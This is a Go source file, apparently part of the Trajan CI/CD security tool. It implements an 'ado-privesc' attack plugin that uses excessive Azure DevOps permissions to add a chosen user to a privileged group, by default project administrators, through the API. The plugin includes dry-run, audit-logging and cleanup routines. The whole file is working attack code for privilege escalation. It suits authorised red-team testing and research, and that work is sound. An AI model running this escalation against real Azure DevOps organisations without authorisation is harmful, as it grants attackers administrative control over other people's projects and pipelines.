package privesc

import (
	"context"
	"fmt"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-privesc", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements privilege escalation via pipeline modification
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new privilege escalation attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-privesc",
			"Attempt privilege escalation via pipeline configuration modification",
			"azuredevops",
			attacks.CategoryCICD,
		),
	}
}

// CanAttack checks if privesc attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	// Requires excessive permissions
	return common.FindingHasType(findings, detections.VulnExcessivePermissions)
}

// Execute performs the privilege escalation attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result := &attacks.AttackResult{
			Plugin:    p.Name(),
			SessionID: opts.SessionID,
			Timestamp: time.Now(),
			Success:   false,
			Message:   err.Error(),
		}
		return result, err
	}

	result, err := p.executeWithClient(ctx, client, opts)
	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, err
}

// executeWithClient performs the privilege escalation attack with an injected client (for testing)
func (p *Plugin) executeWithClient(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get group name from ExtraOpts, default to "project-admin"
	groupFriendly := "project-admin"
	if opts.ExtraOpts != nil {
		if g, ok := opts.ExtraOpts["group"]; ok {
			groupFriendly = g
		}
	}

	// Resolve friendly name to display name
	groupDisplayName, ok := common.ResolveGroupName(groupFriendly)
	if !ok {
		groupDisplayName = groupFriendly // Use as-is if not in predefined list
	}

	// Get user descriptor from ExtraOpts
	userDescriptor := ""
	if opts.ExtraOpts != nil {
		if u, ok := opts.ExtraOpts["user_descriptor"]; ok {
			userDescriptor = u
		}
	}

	if userDescriptor == "" {
		result.Success = false
		result.Message = "user_descriptor required in ExtraOpts"
		return result, fmt.Errorf("missing user_descriptor")
	}

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would add user to '%s' group in %s/%s",
			groupDisplayName, project, repo)
		return result, nil
	}

	// List groups to find the target group descriptor
	groups, err := client.ListGroups(ctx)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list groups: %v", err)
		return result, err
	}

	// Find group descriptor — prefer project-scoped PrincipalName match,
	// fall back to DisplayName for collection-level groups.
	var groupDescriptor string
	var fallbackDescriptor string
	expectedPrincipal := fmt.Sprintf("[%s]\\%s", project, groupDisplayName)
	for _, group := range groups {
		if group.PrincipalName == expectedPrincipal {
			groupDescriptor = group.Descriptor
			break
		}
		if fallbackDescriptor == "" && group.DisplayName == groupDisplayName {
			fallbackDescriptor = group.Descriptor
		}
	}
	if groupDescriptor == "" {
		groupDescriptor = fallbackDescriptor
	}
	if groupDescriptor == "" {
		result.Success = false
		result.Message = fmt.Sprintf("group '%s' not found", groupDisplayName)
		return result, fmt.Errorf("group not found: %s", groupDisplayName)
	}

	// Add user to group
	if err := client.AddMembership(ctx, userDescriptor, groupDescriptor); err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to add membership: %v", err)
		return result, err
	}

	result.Success = true
	result.Message = fmt.Sprintf("User added to '%s' group", groupDisplayName)
	result.Data = map[string]interface{}{
		"user_descriptor":  userDescriptor,
		"group_descriptor": groupDescriptor,
		"group_name":       groupDisplayName,
	}

	// Track cleanup action
	cleanupIdentifier := fmt.Sprintf("%s|%s", userDescriptor, groupDescriptor)
	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        "membership",
			Identifier:  cleanupIdentifier,
			Action:      "remove",
			Description: fmt.Sprintf("Remove user from '%s' group", groupDisplayName),
		},
	}

	return result, nil
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	// Get ADO client
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	return p.cleanupWithClient(ctx, client, session)
}

// cleanupWithClient removes artifacts with an injected client (for testing)
func (p *Plugin) cleanupWithClient(ctx context.Context, client *azuredevops.Client, session *attacks.Session) error {
	// Cleanup this plugin's results
	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			if action.Type == "membership" {
				// Split identifier to get userDesc and groupDesc
				parts := splitCleanupIdentifier(action.Identifier)
				if len(parts) != 2 {
					return fmt.Errorf("invalid membership cleanup identifier: %s", action.Identifier)
				}
				userDesc := parts[0]
				groupDesc := parts[1]

				// Remove user from group
				if err := client.RemoveMembership(ctx, userDesc, groupDesc); err != nil {
					return fmt.Errorf("removing membership %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}

// splitCleanupIdentifier splits the "userDesc|groupDesc" format
func splitCleanupIdentifier(identifier string) []string {
	// Use simple string split on "|"
	var parts []string
	start := 0
	for i := 0; i < len(identifier); i++ {
		if identifier[i] == '|' {
			parts = append(parts, identifier[start:i])
			start = i + 1
		}
	}
	if start < len(identifier) {
		parts = append(parts, identifier[start:])
	}
	return parts
}
